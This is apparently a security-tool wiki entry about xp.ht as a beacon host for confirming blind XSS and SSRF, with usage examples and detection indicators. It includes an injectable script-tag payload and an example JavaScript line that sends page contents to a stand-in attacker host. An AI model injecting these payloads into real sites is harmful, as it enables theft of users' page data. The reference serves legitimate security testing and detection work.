---
id: tool-uuid-001
url: 'https://xp.ht'
name: xp-ht-Beacon-Host
tags:
  - beacon
  - xss
  - detection
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:24.645Z'
validated: true
submitted: true
---
# xp-ht-Beacon-Host

**Status**: Unverified

## Overview

xp.ht is a URL shortening and hosting service commonly repurposed as a beacon host in security testing to detect XSS or SSRF executions by capturing inbound requests from external scripts.

## Description

In offensive security, xp.ht allows quick deployment of static files or endpoints that log visitor details, ideal for blind vulnerabilities where direct feedback is unavailable. It's lightweight, requires no server setup, and supports embedding in payloads like `<script src="//xp.ht/beacon"></script>`. Used in the DoD XSS report to confirm internal execution via referer headers.

## Features

- Feature 1: Simple file hosting for JS/HTML beacons
- Feature 2: Automatic logging of requests, referers, and queries
- Feature 3: Short URLs for evasion in payloads

## Installation

### Requirements

- Web browser or API access
- No local installation needed

### Install Commands

N/A; sign up at https://xp.ht and upload files via dashboard.

## Basic Usage

Upload a beacon file to get a URL like `https://xp.ht/beacon`.

### Common Options

| Option | Description |
|--------|-------------|
| N/A | Web-based upload |

## Examples

### Example 1: Basic Usage

Upload an HTML file with `<img src="https://logger.com/ping">` to trigger on load.

### Example 2: Advanced Usage

Host a JS file that exfils data: `fetch('attacker.com?data='+btoa(document.body.innerHTML));`

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Outbound DNS queries to xp.ht
- Suspicious script src attributes in network traffic
- Log entries for short-domain requests

## Related Procedures


## Related Tools

- [[ngrok]]
- [[requestbin]]

## References

- https://xp.ht
- HackerOne report #923912
